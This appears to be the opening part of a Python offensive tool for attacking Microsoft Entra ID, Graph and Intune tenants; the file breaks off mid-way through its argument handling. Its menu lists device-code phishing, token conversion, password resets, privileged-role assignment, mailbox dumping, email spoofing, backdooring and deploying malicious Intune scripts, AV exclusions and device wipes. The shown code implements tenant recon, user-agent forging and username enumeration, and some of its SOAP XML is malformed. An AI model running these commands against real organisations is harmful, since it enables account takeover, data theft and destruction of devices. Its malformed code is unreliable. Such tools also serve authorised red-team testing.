#!/usr/bin/env python3

import sys
import requests
import json
import jwt
import time
import argparse
import textwrap
import os
import re
import dns.resolver
import base64
from tqdm import tqdm
from tabulate import tabulate
from datetime import datetime, timedelta, timezone
import hashlib
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.hazmat.backends import default_backend
from urllib.parse import urlencode, urlparse, parse_qs
import uuid
import xml.etree.ElementTree as ET
from bs4 import BeautifulSoup

def print_yellow(message):
    print(f"\033[93m{message}\033[0m")

def print_green(message):
    print(f"\033[92m{message}\033[0m")

def print_red(message):
    print(f"\033[91m{message}\033[0m")

def list_commands():

    outsider_commands = [
        ["Invoke-ReconAsOutsider", "Perform outsider recon of the target domain"],
        ["Invoke-UserEnumerationAsOutsider", "Checks whether the uer exists within Azure AD"]
    ]

    auth_commands = [
        ["Get-GraphTokens", "Obtain graph token via device code phish (saved to graph_tokens.txt)"],
        ["Get-TenantID", "Get tenant ID for target domain"],
        ["Get-TokenScope", "Get scope of supplied token"],
        ["Decode-AccessToken", "Get all token payload attributes"],
        ["Invoke-RefreshToMSGraphToken", "Convert refresh token to Microsoft Graph token (saved to new_graph_tokens.txt)"],
        ["Invoke-RefreshToAzureManagementToken", "Convert refresh token to Azure Management token (saved to az_tokens.txt)"],
        ["Invoke-RefreshToVaultToken", "Convert refresh token to Azure Vault token (saved to vault_tokens.txt)"],
        ["Invoke-RefreshToMSTeamsToken", "Convert refresh token to MS Teams token (saved to teams_tokens.txt)"],
        ["Invoke-RefreshToOfficeAppsToken", "Convert refresh token to Office Apps token (saved to officeapps_tokens.txt)"],
        ["Invoke-RefreshToOfficeManagementToken", "Convert refresh token to Office Management token (saved to officemanagement_tokens.txt)"],
        ["Invoke-RefreshToOutlookToken", "Convert refresh token to Outlook token (saved to outlook_tokens.txt)"],
        ["Invoke-RefreshToSubstrateToken", "Convert refresh token to Substrate token (saved to substrate_tokens.txt)"],
        ["Invoke-RefreshToYammerToken", "Convert refresh token to Yammer token (saved to yammer_tokens.txt)"],
        ["Invoke-RefreshToIntuneEnrollmentToken", "Convert refresh token to Intune Enrollment token (saved to intune_tokens.txt)"],
        ["Invoke-RefreshToOneDriveToken", "Convert refresh token to OneDrive token (saved to onedrive_tokens.txt)"],
        ["Invoke-RefreshToSharePointToken", "Convert refresh token to SharePoint token (saved to sharepoint_tokens.txt)"],
        ["Invoke-CertToAccessToken", "Convert Azure Application certificate to JWT access token (saved to cert_tokens.txt)"],
        ["Invoke-ESTSCookieToAccessToken", "Convert ESTS cookie to MS Graph access token (saved to estscookie_tokens.txt)"],
        ["Invoke-AppSecretToAccessToken", "Convert Azure Application secretText credentials to access token (saved to appsecret_tokens.txt)"],
        ["New-SignedJWT", "Construct JWT and sign using Key Vault PEM certificate (Azure Key Vault access token required) then generate Azure Management token"]
    ]

    post_authenum_commands = [
        ["Get-CurrentUser", "Get current user profile"],
        ["Get-CurrentUserActivity", "Get recent activity and actions of current user"],
        ["Get-OrgInfo", "Get information relating to the target organisation"],
        ["Get-Domains", "Get domain objects"],
        ["Get-User", "Get all users (default) or target user (--id)"],
        ["Get-UserProperties", "Get current user properties (default) or target user (--id)"],
        ["Get-UserPrivileges", "Get group/AU memberships and directory roles assgined for current user (default) or target user (--id)"],
        ["Get-UserTransitiveGroupMembership", "Get transitive group memberships for current user (default) or target user (--id)"],
        ["Get-Group", "Get all groups (default) or target group (-id)"],
        ["Get-GroupMember", "Get all members of target group"],
        ["Get-UserAppRoleAssignments", "Get user app role assignments for current user (default) or target user (--id)"],
        ["Get-ConditionalAccessPolicy", "Get conditional access policy properties"],
        ["Get-Application", "Get Enterprise Application details for app (NOT object) ID (--id)"],
        ["Get-AppServicePrincipal", "Get details of the application's service principal from the app ID (--id)"], 
        ["Get-ServicePrincipal", "Get all or specific Service Principal details (--id)"],
        ["Get-ServicePrincipalAppRoleAssignments", "Get Service Principal app role assignments (shows available admin consent permissions that are already granted)"],
        ["Get-PersonalContacts", "Get contacts of the current user"],
        ["Get-CrossTenantAccessPolicy", "Get cross tenant access policy properties"],
        ["Get-PartnerCrossTenantAccessPolicy", "Get partner cross tenant access policy"],
        ["Get-UserChatMessages", "Get ALL messages from all chats for target user (Chat.Read.All)"],
        ["Get-AdministrativeUnitMember", "Get members of administrative unit"],
        ["Get-OneDriveFiles", "Get all accessible OneDrive files for current user (default) or target user (--id)"],
        ["Get-UserPermissionGrants", "Get permission grants of current user (default) or target user (--id)"],
        ["Get-oauth2PermissionGrants", "Get oauth2 permission grants for current user (default) or target user (--id)"],
        ["Get-Messages", "Get all messages in signed-in user's mailbox (default) or target user (--id)"],
        ["Get-TemporaryAccessPassword", "Get TAP details for current user (default) or target user (--id)"],
        ["Get-Password", "Get passwords registered to current user (default) or target user (--id)"],
        ["List-AuthMethods", "List authentication methods for current user (default) or target user (--id)"],
        ["List-DirectoryRoles", "List all directory roles activated in the tenant"],
        ["List-Notebooks", "List current user notebooks (default) or target user (--id)"],
        ["List-ConditionalAccessPolicies", "List conditional access policy objects"],
        ["List-ConditionalAuthenticationContexts", "List conditional access authentication context"],
        ["List-ConditionalNamedLocations", "List conditional access named locations"],
        ["List-SharePointRoot", "List root SharePoint site properties"],
        ["List-SharePointSites", "List any available SharePoint sites"],
        ["List-SharePointURLs", "List SharePoint site web URLs visible to current user"],
        ["List-ExternalConnections", "List external connections"],
        ["List-Applications", "List all Azure Applications"],
        ["List-ServicePrincipals", "List all service principals"],
        ["List-Tenants", "List tenants"],
        ["List-JoinedTeams", "List joined teams for current user (default) or target user (--id)"],
        ["List-Chats", "List chats for current user (default) or target user (--id)"],
        ["List-ChatMessages", "List messages in target chat (--id)"],
        ["List-Devices", "List devices"],
        ["List-AdministrativeUnits", "List administrative units"],
        ["List-OneDrives", "List current user OneDrive (default) or target user (--id)"],
        ["List-RecentOneDriveFiles", "List current user recent OneDrive files"],
        ["List-SharedOneDriveFiles", "List OneDrive files shared with the current user"],
        ["List-OneDriveURLs", "List OneDrive web URLs visible to current user"]
    ]

    post_authexploit_commands = [
        ["Invoke-CustomQuery", "Custom GET query to target Graph API endpoint"],
        ["Invoke-Search", "Search for string within entity type (driveItem, message, chatMessage, site, event)"],
        ["Find-PrivilegedRoleUsers", "Find users with privileged roles assigned"],
        ["Find-PrivilegedApplications", "Find privileged apps (via their service principal) with granted admin consent API permissions"],
        ["Find-UpdatableGroups", "Find groups which can be updated by the current user"],
        ["Find-SecurityGroups", "Find security groups and group members"],
        ["Find-DynamicGroups", "Find groups with dynamic membership rules"],
        ["Update-UserPassword", "Update the passwordProfile of the target user (NewUserS3cret@Pass!)"],
        ["Update-UserProperties", "Update the user properties of the target user"],
        ["Add-UserTAP", "Add new Temporary Access Password (TAP) to target user"],
        ["Add-GroupMember", "Add member to target group"],
        ["Add-ApplicationPassword", "Add client secret to target application"],
        ["Add-ApplicationCertificate", "Add client certificate to target application"],
        ["Add-ApplicationPermission", "Add permission to target application e.g. Mail.Send and attempt to grant admin consent"],
        ["Grant-AppAdminConsent", "Grant admin consent for Graph API permission already assigned to enterprise application"],
        ["Create-Application", "Create new enterprise application with default settings"],
        ["Create-NewUser", "Create new Entra ID user"],
        ["Invite-GuestUser", "Invite guest user to Entra ID"],
        ["Assign-PrivilegedRole", "Assign chosen privileged role to user/group/object"],
        ["Open-OWAMailboxInBrowser", "Open an OWA Office 365 mailbox in BurpSuite's embedded Chromium browser using either a Substrate.Office.com or Outlook.Office.com access token"],
        ["Dump-OWAMailbox", "Dump OWA Office 365 mailbox"],
        ["Spoof-OWAEmailMessage", "Send email from current user's Outlook mailbox or spoof another user (--id) (Mail.Send)"]
    ]

    intune_enum = [
        ["Get-ManagedDevices", "Get managed devices"],
        ["Get-UserDevices", "Get user devices"],
        ["Get-CAPs", "Get conditional access policies"],
        ["Get-DeviceCategories", "Get device categories"],
        ["Get-DeviceComplianceSummary", "Get device compliance summary"],
        ["Get-DeviceConfigurations", "Get device configurations"],
        ["Get-DeviceConfigurationPolicies", "Get device configuration policies and assignment details (av, asr, diskenc, etc.)"],
        ["Get-DeviceConfigurationPolicySettings", "Get device configuration policy settings"],
        ["Get-DeviceEnrollmentConfigurations", "Get device enrollment configurations"],
        ["Get-DeviceGroupPolicyConfigurations", "Get device group policy configurations and assignment details"],
        ["Get-DeviceGroupPolicyDefinition", "Get device group policy definition"],
        ["Get-RoleDefinitions", "Get role definitions"],
        ["Get-RoleAssignments", "Get role assignments"],
        ["Get-DeviceCompliancePolicies", "Get device compliance policies"]
    ]

    intune_exploit = [
        ["Dump-DeviceManagementScripts", "Dump device management PowerShell scripts"],
        ["Dump-WindowsApps", "Dump managed Windows OS applications (exe, msi, appx, msix, etc.)"],
        ["Dump-iOSApps", "Dump managed iOS/iPadOS mobile applications"],
        ["Dump-macOSApps", "Dump managed macOS applications"],
        ["Dump-AndroidApps", "Dump managed Android mobile applications"],
        ["Get-ScriptContent", "Get device management script content"],
        ["Backdoor-Script", "Add malicious code to pre-existing device management script"],
        ["Deploy-MaliciousScript", "Deploy new malicious device management PowerShell script (all devices)"],
        # Deploy-MaliciousWin32Exe - Deploy malicious exe to managed devices
        # Deploy-MaliciousWin32MSI - Deploy malicious MSI to managed devices
        ["Display-AVPolicyRules", "Display antivirus policy rules"],
        ["Display-ASRPolicyRules", "Display Attack Surface Reduction (ASR) policy rules"],
        ["Display-DiskEncryptionPolicyRules", "Display disk encryption policy rules"],
        ["Display-FirewallRulePolicyRules", "Display firewall RULE policy rules"],
        ["Display-EDRPolicyRules", "Display EDR policy rules"],
        ["Display-LAPSAccountProtectionPolicyRules", "Display LAPS account protection policy rules"],
        ["Display-UserGroupAccountProtectionPolicyRules", "Display user group account protection policy rules"],
        ["Add-ExclusionGroupToPolicy", "Bypass av, asr, etc. rules by adding an exclusion group containing compromised user or device"],
        ["Reboot-Device", "Reboot managed device"],
        ["Retire-Device", "Retire managed device"],
        ["Lock-Device", "Lock managed device"],
        ["Shutdown-Device", "Shutdown managed device"],
        ["Update-DeviceConfig", "Update properties of the managed device configuration"]
    ]

    cleanup_commands = [
        ["Delete-User", "Delete a user"],
        ["Delete-Group", "Delete a group"],
        ["Remove-GroupMember", "Remove user from a group"],
        ["Delete-Application", "Delete an application"],
        ["Delete-Device", "Delete managed device"],
        ["Wipe-Device", "Wipe managed device"],
    ]

    locator_commands = [
        ["Locate-ObjectID", "Locate object ID and display object properties"],
        ["Locate-PermissionID", "Locate Graph permission details (application/delegated, description, admin consent required, ...) for ID"]
    ]

    print("\nOutsider")
    print("=" * 80)
    print(tabulate(outsider_commands, tablefmt="plain"))

    print("\nAuthentication")
    print("=" * 80)
    print(tabulate(auth_commands, tablefmt="plain"))

    print("\nPost-Auth Enumeration")
    print("=" * 80)
    print(tabulate(post_authenum_commands, tablefmt="plain"))

    print("\nPost-Auth Exploitation")
    print("=" * 80)
    print(tabulate(post_authexploit_commands, tablefmt="plain"))

    print("\nPost-Auth Intune Enumeration")
    print("=" * 80)
    print(tabulate(intune_enum, tablefmt="plain"))

    print("\nPost-Auth Intune Exploitation")
    print("=" * 80)
    print(tabulate(intune_exploit, tablefmt="plain"))

    print("\nCleanup")
    print("=" * 80)
    print(tabulate(cleanup_commands, tablefmt="plain"))

    print("\nLocators")
    print("=" * 80)
    print(tabulate(locator_commands, tablefmt="plain"))
    print("\n")

def forge_user_agent(device=None, browser=None):

    user_agent = ''

    if device == 'Mac':
        if browser == 'Chrome':
            user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
        elif browser == 'Firefox':
            user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0'
        elif browser == 'Edge':
            user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/604.1 Edg/91.0.100.0'
        elif browser == 'Safari':
            user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
        else:
            user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'

    elif device == 'Windows':
        if browser == 'IE':
            user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
        elif browser == 'Chrome':
            user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
        elif browser == 'Firefox':
            user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0'
        elif browser == 'Edge':
            user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'
        else:
            user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'

    elif device == 'AndroidMobile':
        if browser == 'Android':
            user_agent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
        elif browser == 'Chrome':
            user_agent = 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36'
        elif browser == 'Firefox':
            user_agent = 'Mozilla/5.0 (Android 4.4; Mobile; rv:70.0) Gecko/70.0 Firefox/70.0'
        elif browser == 'Edge':
            user_agent = 'Mozilla/5.0 (Linux; Android 8.1.0; Pixel Build/OPM4.171019.021.D1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 EdgA/42.0.0.2057'
        else:
            user_agent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'

    elif device == 'iPhone':
        if browser == 'Chrome':
            user_agent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.114 Mobile/15E148 Safari/604.1'
        elif browser == 'Firefox':
            user_agent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4'
        elif browser == 'Edge':
            user_agent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 EdgiOS/44.5.0.10 Mobile/15E148 Safari/604.1'
        elif browser == 'Safari':
            user_agent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'
        else:
            user_agent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1'

    else:
        if browser == 'Android':
            user_agent = 'Mozilla/5.0 (Linux; U; Android 4.0.2; en-us; Galaxy Nexus Build/ICL53F) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
        elif browser == 'IE':
            user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
        elif browser == 'Chrome':
            user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
        elif browser == 'Firefox':
            user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0'
        elif browser == 'Safari':
            user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'
        else:
            user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042'

    return user_agent

def get_user_agent(args):
    if args.device:
        if args.browser:
            return forge_user_agent(device=args.device, browser=args.browser)
        else:
            return forge_user_agent(device=args.device)
    else:
        if args.browser:
            return forge_user_agent(browser=args.browser)
        else:
            return forge_user_agent()

def get_access_token(token_input):
    if os.path.isfile(token_input):
        with open(token_input, 'r', encoding='utf-16') as file:
            access_token = file.read().strip()
    else:
        access_token = token_input
    return access_token

def read_file_content(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            return file.read()
    except UnicodeDecodeError:
        with open(file_path, 'r', encoding='utf-16') as file:
            return file.read()

def format_list_style(data):
    if not data.get('value'):
        print_red("[-] No data found")
        return

    for d in data.get('value', []):
        for key, value in d.items():
            print(f"{key} : {value}")
        print("\n")

def graph_api_get(access_token, url, args):
    try:
        output_returned = False
        while url:

            user_agent = get_user_agent(args)
            headers = {
                "Authorization": f"Bearer {access_token}",
                "User-Agent": user_agent
            }
            response = requests.get(url, headers=headers)
            response.raise_for_status()
            response_body = response.json()
            filtered_data = {key: value for key, value in response_body.items() if not key.startswith("@odata")}

            if filtered_data:
                format_list_style(filtered_data)
                output_returned = True

            url = response_body.get("@odata.nextLink")
        
        if not output_returned:
            print_red("[-] No data found")

    except requests.exceptions.RequestException as ex:
        print_red(f"[-] HTTP Error: {ex}")


def get_tenant_domains(domain):

    domains = [domain]
    try:
        openid_config_url = f"https://login.microsoftonline.com/{domain}/.well-known/openid-configuration"
        response = requests.get(openid_config_url)
        response.raise_for_status()
        openid_config = response.json()
        tenant_region_sub_scope = openid_config.get("tenant_region_sub_scope", "")

        if tenant_region_sub_scope == "DOD":
            autodiscover_url = "https://autodiscover-s-dod.office365.us/autodiscover/autodiscover.svc"
        elif tenant_region_sub_scope == "DODCON":
            autodiscover_url = "https://autodiscover-s.office365.us/autodiscover/autodiscover.svc"
        else:
            autodiscover_url = "https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc"

        autodiscover_body = f"""
        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:exm="http://schemas.microsoft.com/exchange/services/2006/messages"
                    xmlns:ext="http://schemas.microsoft.com/exchange/services/2006/types"
                    xmlns:a="http://www.w3.org/2005/08/addressing"
                    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
                    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                    xmlns:xsd="http://www.w3.org/2001/XMLSchema">
            <soap:Header>
                <a:Action soap:mustUnderstand="1">http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation</a:Action>
                <a:To soap:mustUnderstand="1">{autodiscover_url}</a:To>
                <a:ReplyTo>
                    <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
                </a:ReplyTo>
            </soap:Header>
            <soap:Body>
                <GetFederationInformationRequestMessage xmlns="http://schemas.microsoft.com/exchange/2010/Autodiscover">
                    <Request>
                        <Domain>{domain}</Domain>
                    </Request>
                </GetFederationInformationRequestMessage>
            </soap:Body>
        </soap:Envelope>
        """.strip()

        headers = {
            "Content-Type": "text/xml; charset=utf-8",
            "SOAPAction": '"http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation"',
            "User-Agent": "AutodiscoverClient"
        }

        autodiscover_response = requests.post(autodiscover_url, data=autodiscover_body, headers=headers)
        autodiscover_response.raise_for_status() 
        autodiscover_xml = autodiscover_response.content
        tree = ET.ElementTree(ET.fromstring(autodiscover_xml))
        namespaces = {
            's': 'http://schemas.xmlsoap.org/soap/envelope/',
            'a': 'http://www.w3.org/2005/08/addressing',
            'm': 'http://schemas.microsoft.com/exchange/services/2006/messages',
            't': 'http://schemas.microsoft.com/exchange/services/2006/types',
            'ns2': 'http://schemas.microsoft.com/exchange/2010/Autodiscover'
        }

        found_domains = [elem.text for elem in tree.findall('.//ns2:Domain', namespaces)]

        if domain not in found_domains:
            found_domains.append(domain)

        domains = sorted(found_domains)

    except Exception as e:
        print(f"An unexpected error occurred: {e}")

    return domains

def get_credential_type(username, flow_token=None, original_request=None):
    body = {
        "username": username,
        "isOtherIdpSupported": True,
        "checkPhones": True,
        "isRemoteNGCSupported": False,
        "isCookieBannerShown": False,
        "isFidoSupported": False,
        "originalRequest": original_request,
        "flowToken": flow_token
    }

    if original_request:
        body["isAccessPassSupported"] = True

    try:
        response = requests.post("https://login.microsoftonline.com/common/GetCredentialType",
                                 json=body,
                                 headers={"Content-Type": "application/json; charset=UTF-8"})
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error in Get-CredentialType: {e}")
        return None

def get_rst_token(url, endpoint_address, username, password="none"):
    request_id = str(uuid.uuid4())
    now = datetime.utcnow()
    created = now.isoformat() + "Z"
    expires = (now + timedelta(minutes=10)).isoformat() + "Z"

    body = f"""
    <?xml version='1.0' encoding='UTF-8'?>
    <s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
        <s:Header>
            <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
            <wsa:To s:mustUnderstand='1'>{url}</wsa:To>
            <wsa:MessageID>urn:uuid:{str(uuid.uuid4())}</wsa:MessageID>
            <wsse:Security s:mustUnderstand="1">
                <wsu:Timestamp wsu:Id="_0">
                    <wsu:Created>{created}</wsu:Created>
                    <wsu:Expires>{expires}</wsu:Expires>
                </wsse:Timestamp>
                <wsse:UsernameToken wsu:Id="uuid-{str(uuid.uuid4())}">
                    <wsse:Username>{username}</wsse:Username>
                    <wsse:Password>{password}</wsse:Password>
                </wsse:UsernameToken>
            </wsse:Security>
        </s:Header>
        <s:Body>
            <wst:RequestSecurityToken Id='RST0'>
                <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
                <wsp:AppliesTo>
                    <wsa:EndpointReference>
                        <wsa:Address>{endpoint_address}</wsa:Address>
                    </wsp:AppliesTo>
                    <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
            </wst:RequestSecurityToken>
        </s:Body>
    </s:Envelope>
    """

    try:
        response = requests.post(url,
                                 data=body,
                                 headers={"Content-Type": "application/soap+xml; charset=UTF-8"},
                                 timeout=10)
        response.raise_for_status()
        response_xml = response.content

        # parse the response XML (might need to check this)
        if "urn:oasis:names:tc:SAML:1.0:assertion" in response_xml.decode():
            return True
        return False
    except requests.exceptions.RequestException as e:
        print(f"Error in Get-RSTToken: {e}")
        return None

def does_user_exist(user, method="Normal"):
    exists = False
    error_details = ""

    if method == "Normal":
        cred_type = get_credential_type(user)
        if cred_type:
            if cred_type.get('ThrottleStatus') == 1:
                print("Requests throttled!")
                return None
            exists = cred_type.get('IfExistsResult') in [0, 6]
    else:
        if method == "Login":
            random_guid = str(uuid.uuid4())
            body = {
                "resource": random_guid,
                "client_id": random_guid,
                "grant_type": "password",
                "username": user,
                "password": "none",
                "scope": "openid"
            }
            try:
                response = requests.post("https://login.microsoftonline.com/common/oauth2/token",
                                         data=body,
                                         headers={"Content-Type": "application/x-www-form-urlencoded"})
                response.raise_for_status()
                exists = True
            except requests.exceptions.RequestException as e:
                error_details = e.response.json().get("error_description", "")

        elif method in ["Autologon", "RST2"]:
            request_id = str(uuid.uuid4())
            domain = user.split("@")[1]
            password = "none"
            now = datetime.utcnow()
            created = now.isoformat() + "Z"
            expires = (now + timedelta(minutes=10)).isoformat() + "Z"

            if method == "RST2":
                url = "https://login.microsoftonline.com/RST2.srf"
                end_point = "sharepoint.com"
            else:
                url = f"https://autologon.microsoftazuread-sso.com/{domain}/winauth/trust/2005/usernamemixed?client-request-id={request_id}"
                end_point = "urn:federation:MicrosoftOnline"

            try:
                response = get_rst_token(url, end_point, user, password)
                exists = response is not None
            except Exception as e:
                error_details = str(e)

    if not exists and error_details:
        if error_details.startswith("AADSTS50053"):
            exists = True
        elif error_details.startswith("AADSTS50126"):
            exists = True
        elif error_details.startswith("AADSTS50076"):
            exists = True
        elif error_details.startswith("AADSTS700016"):
            exists = True
        elif error_details.startswith("AADSTS50034"):
            exists = False
        elif error_details.startswith("AADSTS50059"):
            exists = False
        elif error_details.startswith("AADSTS81016"):
            print("Got Invalid STS request. The tenant may not have DesktopSSO or Directory Sync enabled.")
            return None
        else:
            return None

    return exists

def main():
    parser = argparse.ArgumentParser(
    formatter_class=argparse.RawDescriptionHelpFormatter,
    epilog=textwrap.dedent('''\
        examples:
          graphpython.py --command invoke-reconasoutsider --domain company.com
          graphpython.py --command invoke-userenumerationasoutsider --username <email@company.com/emails.txt>
          graphpython.py --command get-graphtokens
          graphpython.py --command invoke-refreshtoazuremanagementtoken --tenant <tenant-id> --token refresh-token
          graphpython.py --command get-users --token eyJ0... -- select displayname,id [--id <userid>]
          graphpython.py --command list-recentonedrivefiles --token token
          graphpython.py --command invoke-search --search "credentials" --entity driveItem --token token
          graphpython.py --command invoke-customquery --query https://graph.microsoft.com/v1.0/sites/{siteId}/drives --token token
          graphpython.py --command assign-privilegedrole --token token
          graphpython.py --command spoof-owaemailmessage [--id <userid to spoof>] --token token --email email-body.txt
          graphpython.py --command get-manageddevices --token intune-token
          graphpython.py --command deploy-maliciousscript --script malicious.ps1 --token token
          graphpython.py --command backdoor-script --id <scriptid> --script backdoored-script.ps1 --token token
          graphpython.py --command add-exclusiongrouptopolicy --id <policyid> --token token
          graphpython.py --command reboot-device --id <deviceid> --token eyj0...
    ''')
)
    parser.add_argument("--command", help="Command to execute")
    parser.add_argument("--list-commands", action="store_true", help="List available commands")
    parser.add_argument("--token", help="Microsoft Graph access token or refresh token for FOCI abuse")
    parser.add_argument("--estsauthcookie", help="'ESTSAuth' or 'ESTSAuthPersistent' cookie value")
    parser.add_argument("--use-cae", action="store_true", help="Flag to use Continuous Access Evaluation (CAE) - add 'cp1' as client claim to get an access token valid for 24 hours")
    parser.add_argument("--cert", help="X509Certificate path (.pfx)")
    parser.add_argument("--domain", help="Target domain")
    parser.add_argument("--tenant", help="Target tenant ID")
    parser.add_argument("--username", help="Username or file containing username (invoke-userenumerationasoutsider)")
    parser.add_argument("--secret", help="Enterprise application secretText (invoke-appsecrettoaccesstoken)")
    parser.add_argument("--id", help="ID of target object")
    parser.add_argument("--select", help="Fields to select from output")
    parser.add_argument("--query", help="Raw API query (GET only)")
    parser.add_argument("--search", help="Search string")
    parser.add_argument("--entity", choices=['driveItem', 'message', 'chatMessage', 'site', 'event'],help="Search entity type: driveItem(OneDrive), message(Mail), chatMessage(Teams), site(SharePoint), event(Calenders)")
    parser.add_argument("--device", choices=['mac', 'windows', 'androidmobile', 'iphone'], help="Device type for User-Agent forging")
    parser.add_argument("--browser", choices=['android', 'IE', 'chrome', 'firefox', 'edge', 'safari'], help="Browser type for User-Agent forging")
    parser.add_argument("--only-return-cookies", action="store_true", help="Only return cookies from the request (open-owamailboxinbrowser)")
    parser.add_argument("--mail-folder", choices=['allitems', 'inbox', 'archive', 'drafts', 'sentitems', 'deleteditems', 'recoverableitemsdeletions'], help="Mail folder to dump (dump-owamailbox)")
    parser.add_argument("--top", type=int, help="Number (int) of messages to retrieve (dump-owamailbox)")
    parser.add_argument("--script", help="File containing the script content (deploy-maliciousscript and backdoor-script)")
    parser.add_argument("--email", help="File containing OWA email message body content (spoof-owaemailmessage)")
    args = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()

    available_commands = [
        "invoke-reconasoutsider","invoke-userenumerationasoutsider","get-graphtokens", "get-tenantid", "get-tokenscope", "decode-accesstoken",
        "invoke-refreshtomsgraphtoken", "invoke-refreshtoazuremanagementtoken", "invoke-refreshtovaulttoken",
        "invoke-refreshtomsteamstoken", "invoke-refreshtoofficeappstoken", "invoke-refreshtoofficemanagementtoken",
        "invoke-refreshtooutlooktoken", "invoke-refreshtosubstratetoken", "invoke-refreshtoyammertoken", "invoke-refreshtointuneenrollment",
        "invoke-refreshtoonedrivetoken", "invoke-refreshtosharepointtoken", "invoke-certtoaccesstoken", "invoke-estscookietoaccesstoken", "invoke-appsecrettoaccesstoken",
        "new-signedjwt", "get-currentuser", "get-currentuseractivity", "get-orginfo", "get-domains", "get-user", "get-userproperties", 
        "get-userprivileges", "get-usertransitivegroupmembership", "get-group", "get-groupmember", "get-userapproleassignments", "get-serviceprincipalapproleassignments",
        "get-conditionalaccesspolicy", "get-personalcontacts", "get-crosstenantaccesspolicy", "get-partnercrosstenantaccesspolicy", 
